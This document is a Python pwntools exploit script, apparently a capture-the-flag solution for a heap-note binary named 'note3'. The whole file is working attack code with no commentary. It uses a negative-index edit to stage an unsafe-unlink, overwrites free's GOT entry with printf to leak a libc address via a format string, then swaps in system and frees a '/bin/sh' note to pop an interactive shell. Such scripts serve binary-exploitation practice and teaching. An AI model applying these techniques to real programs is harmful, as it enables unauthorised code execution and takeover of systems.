from pwn import *
from LibcSearcher import *
io = process('./note3')
context(arch='amd64',os='linux')
context.log_level = 'debug'
elf = ELF('./note3')

def new(size,content):
	io.recvuntil('option--->>\n')
	io.sendline('1')
	io.recvuntil('1024)\n')
	io.sendline(str(size))
	io.recvuntil('content:\n')
	io.sendline(content)
	
def show():
	delete(0)
	return io.recvuntil('D')[:-1]
	
def write(where,what):
	edit(3,p64(where))
	edit(0,(what))
	
	
def edit(idx,content):
	io.recvuntil('option--->>\n')
	io.sendline('3')
	io.recvuntil('note:\n')
	io.sendline(str(idx))
	io.recvuntil('content:\n')
	io.sendline(content)
	
def delete(idx):
	io.recvuntil('option--->>\n')
	io.sendline('4')
	io.recvuntil('note:\n')
	io.sendline(str(idx))
	

new(0x80,'a')
new(0x80,'a')
new(0x80,'a')
new(0x80,'a')
new(0x80,'a')
new(0x80,'a')
new(0x80,'/bin/sh\x00')
new(0x80,'/bin/sh\x00')
edit(3,'a')
payload = p64(0)+p64(0x20)+p64(0x6020e0-0x18)+p64(0x6020e0-0x10)+p64(0x20)
payload = payload.ljust(0x80,'a')
payload += p64(0x80)+p64(0x90)
edit(-0x8000000000000000,payload)
#gdb.attach(io,'b *0x400BB9')
#raw_input()
delete(4)

free_got = elf.got['free']
printf_plt = elf.plt['printf']
puts_plt = elf.plt['puts']
#gdb.attach(io,'b *0x400CB8')
#raw_input()
write(free_got,p64(printf_plt)[:-1])
write(0x6020e8,'%11$p\x00')
#gdb.attach(io,'b *0x400BB9')
#raw_input()
libc_start_main = int(show(),16)-240
obj = LibcSearcher('__libc_start_main',libc_start_main)
libc_base = libc_start_main - obj.dump('__libc_start_main')
system = obj.dump('system')+libc_base
log.success('system: '+hex(system))
write(free_got,p64(system)[:-1])
#gdb.attach(io,'b *0x400BB9')
#raw_input()
delete(6)
io.interactive()
